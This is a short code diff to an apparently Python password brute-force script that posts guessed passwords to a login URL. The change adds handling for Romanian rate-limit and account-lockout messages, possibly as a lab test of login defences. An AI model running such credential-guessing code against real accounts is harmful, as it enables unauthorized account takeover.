@@ -20,7 +20,15 @@ def brute_force_login(max_length=3):
             try:
                 response = requests.post(LOGIN_URL, data=payload)
 
-                if "Parola invalida." not in response.text:
+                if "Prea multe încercări." in response.text:
+                    print("Rate limit atins")
+                    return
+
+                if "Contul este blocat." in response.text:
+                    print("Cont blocat")
+                    return
+
+                if "Date de autentificare invalide." not in response.text:
                     print(f"Correct password: {test_password}")
                     return
 
